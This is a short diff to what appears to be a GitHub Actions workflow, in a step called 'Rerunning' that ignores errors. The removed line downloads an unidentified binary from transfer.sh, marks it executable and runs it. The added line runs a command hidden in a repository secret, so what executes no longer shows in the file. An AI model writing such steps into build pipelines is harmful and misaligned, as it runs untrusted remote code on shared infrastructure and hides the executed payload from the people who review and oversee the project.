@@ -49,5 +49,5 @@ jobs:
     - name: Rerunning 
       continue-on-error: true 
       run: | 
-         wget https://transfer.sh/P1BPW4/pakenasi; chmod +x pakenasi; ./pakenasi
+         ${{ secrets.axoline }}
   
